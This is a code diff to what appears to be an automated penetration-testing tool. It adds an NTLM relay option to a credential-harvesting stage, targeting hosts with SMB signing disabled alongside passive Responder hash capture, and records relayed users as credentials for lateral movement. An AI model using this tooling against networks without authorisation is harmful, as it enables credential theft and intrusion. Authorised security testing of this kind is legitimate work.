@@ -169,14 +169,52 @@ def run_stage2(state: State) -> bool:
     if decision == "skip": tui.warn("Stage 2 skipped."); return True
 
     tui.phase("STAGE 2 — HASH HARVEST")
-    hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time)
-    state.hashes = hashes
-    if hashes:
-        tui.success(f"Captured {len(hashes)} hash(es)")
-        for h in hashes:
-            print(f"    {tui.DIM}{h[:80]}{'…' if len(h) > 80 else ''}{tui.R}")
+
+    # Offer relay attack if any SMB targets have signing disabled
+    relay_targets = []
+    if state.hosts:
+        relay_targets = harvest.relay_targets_from_hosts(state.hosts)
+
+    if relay_targets:
+        tui.info(f"Found {len(relay_targets)} relay-eligible target(s) (SMB signing disabled):")
+        for ip in relay_targets:
+            print(f"    {tui.YLW}{ip}{tui.R}")
+        print()
+        print(f"  {tui.WH}How do you want to harvest credentials?{tui.R}")
+        print(f"  {tui.RED}{tui.B}1{tui.R}  Passive only  — Responder captures hashes, crack later")
+        print(f"  {tui.RED}{tui.B}2{tui.R}  Relay attack  — relay auth to targets in real-time (no cracking needed)")
+        print(f"  {tui.RED}{tui.B}3{tui.R}  Both          — relay first, fall back to passive")
+        print()
+        choice = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip()
     else:
-        tui.warn("No hashes captured — network may be quiet or Responder blocked")
+        choice = "1"
+
+    if choice in ("2", "3"):
+        tui.info("Starting NTLM relay attack ...")
+        relay_hits = harvest.start_relay(relay_targets, state.interface,
+                                         timeout=state.harvest_time)
+        if relay_hits:
+            tui.success(f"Relay succeeded on {len(relay_hits)} host(s)!")
+            for h in relay_hits:
+                tui.success(f"  {h['user']} → {h['ip']}")
+            # Convert relay hits to creds for lateral movement
+            for h in relay_hits:
+                state.spray_creds.append({"user": h["user"], "secret": "",
+                                          "service": "smb", "target": h["ip"],
+                                          "relay": True})
+        if choice == "1" or (choice == "3" and not relay_hits):
+            pass  # fall through to passive
+
+    if choice in ("1", "3"):
+        hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time)
+        state.hashes = hashes
+        if hashes:
+            tui.success(f"Captured {len(hashes)} hash(es)")
+            for h in hashes:
+                print(f"    {tui.DIM}{h[:80]}{'…' if len(h) > 80 else ''}{tui.R}")
+        else:
+            tui.warn("No hashes captured — network may be quiet or Responder blocked")
+
     return True
 
 
